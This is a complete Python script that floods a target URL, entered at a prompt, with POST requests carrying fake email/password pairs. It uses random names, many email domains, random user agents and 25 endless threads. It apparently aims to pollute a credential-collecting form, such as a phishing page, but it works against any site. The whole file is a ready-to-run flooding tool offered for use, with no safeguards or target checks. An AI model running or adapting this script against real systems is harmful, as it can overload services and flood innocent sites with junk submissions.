import threading
import requests
import random
import string
import names
import logging
import time
from emailHosts import email_domains
from fake_useragent import UserAgent


# Set up logging
logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
)


def name_gen():  # Generates a random name for the email
    name_system = random.choice(
        ["FullName", "FullFirstFirstInitial", "FirstInitialFullLast"]
    )
    first_name = names.get_first_name()
    last_name = names.get_last_name()
    if name_system == "FullName":  # JohnDoe
        return first_name + last_name
    elif name_system == "FullFirstFirstInitial":  # JohnD
        return first_name + last_name[0]
    return first_name[0] + last_name  # JDoe


def generate_random_email():  # Generate email with combination of name and domain
    name = name_gen()
    NumberOrNo = random.choice(["Number", "No"])
    domain = random.choice(email_domains)  # 140+ domains
    if NumberOrNo == "Number":
        return name + str(random.randint(1, 100)) + domain
    else:
        return name + domain


def generate_random_password():  # Generate password using uppercase, lowercase, numbers and special characters
    characters = string.ascii_letters + string.digits + "@$!%^&*"
    length = random.randint(12, 20)  # Random length between 12 and 20
    return "".join(random.choice(characters) for _ in range(length))


def send_posts(url):
    while True:
        try:
            email = generate_random_email()
            password = generate_random_password()
            data = {"a": email, "az": password}
            ua = UserAgent()
            user_agent = ua.random
            headers = {"User-Agent": user_agent}

            response = requests.post(url, data=data, headers=headers)
            logging.info(
                f"Email: {email}, Password: {password}, Status Code: {response.status_code}, User-Agent: {user_agent}"
            )

            if response.status_code != 200:
                logging.error(f"Error: Received status code {response.status_code}")
                time.sleep(random.uniform(1, 5))  # Random delay between 1 and 5 seconds

        except requests.RequestException as e:
            logging.error(f"Request failed: {e}")
            time.sleep(5)  # Wait for 5 seconds before retrying
            
        except Exception as e:
            logging.error(f"An unexpected error occurred: {e}")
            time.sleep(5)  # Wait for 5 seconds before retrying


def main():
    url = input("Enter the URL of the target you want to flood: ")
    try:
        threads = [
            threading.Thread(target=send_posts, args=(url,), daemon=True)
            for _ in range(25)
        ]

        for t in threads:
            t.start()

        for t in threads:
            t.join()
    except Exception as e:
        print(f"Error in main: {e}")


if __name__ == "__main__":
    main()
